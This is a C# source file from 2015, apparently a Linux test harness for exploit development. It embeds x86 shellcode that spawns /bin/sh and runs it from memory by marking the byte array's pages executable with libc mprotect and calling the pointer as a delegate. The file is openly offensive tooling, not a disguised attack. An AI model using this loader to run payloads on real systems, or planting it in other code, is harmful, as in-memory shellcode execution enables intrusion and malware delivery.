// C# shellcode execution frame. Works for shellcode of any size
//
// Build command:
//     mcs scframe-libc.cs
//
// Author: Oleg Mitrofanov (reider-roque) 2015

using System;
using System.Runtime.InteropServices;

class MainClass
{
    private static String shellcode = "\x31\xc9\xf7\xe1\x51\x68\x6e\x2f\x73\x68" +
        "\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80";

	[DllImport("libc", SetLastError=true)]
	private static extern int mprotect(IntPtr addr, Int32 len, UInt32 prot);
	private const UInt32 PROT_WRITE = 0x2;   /* Page can be written.  */
	private const UInt32 PROT_EXEC = 0x4;    /* Page can be executed.  */

	[DllImport("libc", SetLastError=true)]
	private static extern Int32 sysconf(Int32 sysconfName);
	private const Int32 _SC_PAGESIZE = 30;
	private static Int32 PAGE_SIZE = sysconf(_SC_PAGESIZE);

    private static void Main(string[] args)
    {
        ExecShellcode();
    }

    private static IntPtr GetPageBaseAddress(IntPtr p)
    {
        return (IntPtr)((Int32)p & ~(PAGE_SIZE - 1));
    }

    private static void MakeMemoryExecutable(IntPtr pagePtr)
    {
		var mprotectResult = mprotect(pagePtr, PAGE_SIZE, PROT_EXEC | PROT_WRITE);

        if (mprotectResult != 0) 
        {
            Console.WriteLine ("Error: mprotect failed to make page at 0x{0} " +
                "address executable! Result: {1}", mprotectResult);
            Environment.Exit (1);
        }
    }

    private delegate void ShellcodeFuncPrototype();

    private static void ExecShellcode()
    {
        // Convert shellcode string to byte array
        Byte[] sc_bytes = new Byte[shellcode.Length];
        for (int i = 0; i < shellcode.Length; i++) 
        {
            sc_bytes [i] = (Byte) shellcode [i];
        }

        // Prevent garbage collector from moving the shellcode byte array
        GCHandle pinnedByteArray = GCHandle.Alloc(sc_bytes, GCHandleType.Pinned);

        // Get handle for shellcode address and address of the page it is located in
        IntPtr shellcodePtr = pinnedByteArray.AddrOfPinnedObject();
        IntPtr shellcodePagePtr = GetPageBaseAddress(shellcodePtr);
        Int32 shellcodeOffset = (Int32)shellcodePtr - (Int32)shellcodePagePtr;
        Int32 shellcodeLen = sc_bytes.GetLength (0);

        // Some debugging information
        Console.WriteLine ("Page Size: {0}", PAGE_SIZE.ToString ());
        Console.WriteLine ("Shellcode address: 0x{0}", shellcodePtr.ToString("x"));
        Console.WriteLine ("First page start address: 0x{0}", 
            shellcodePagePtr.ToString("x"));
        Console.WriteLine ("Shellcode offset: {0}", shellcodeOffset);
        Console.WriteLine ("Shellcode length: {0}", shellcodeLen);

        // Make shellcode memory executable
        MakeMemoryExecutable(shellcodePagePtr);

        // Check if shellcode spans across more than 1 page; make all extra pages
        // executable too
        Int32 pageCounter = 1;
        while (shellcodeOffset + shellcodeLen > PAGE_SIZE) 
        {
            shellcodePagePtr = 
                GetPageBaseAddress(shellcodePtr + pageCounter * PAGE_SIZE);
            pageCounter++;
            shellcodeLen -= PAGE_SIZE;

            MakeMemoryExecutable(shellcodePagePtr);
        }

        // Debug information
        Console.WriteLine ("Pages taken by the shellcode: {0}",
            pageCounter);

        // Make shellcode callable by converting pointer to delegate
        ShellcodeFuncPrototype shellcode_func = 
            (ShellcodeFuncPrototype) Marshal.GetDelegateForFunctionPointer(
                shellcodePtr, typeof(ShellcodeFuncPrototype));

        shellcode_func(); // Execute shellcode

        pinnedByteArray.Free();
    }
}
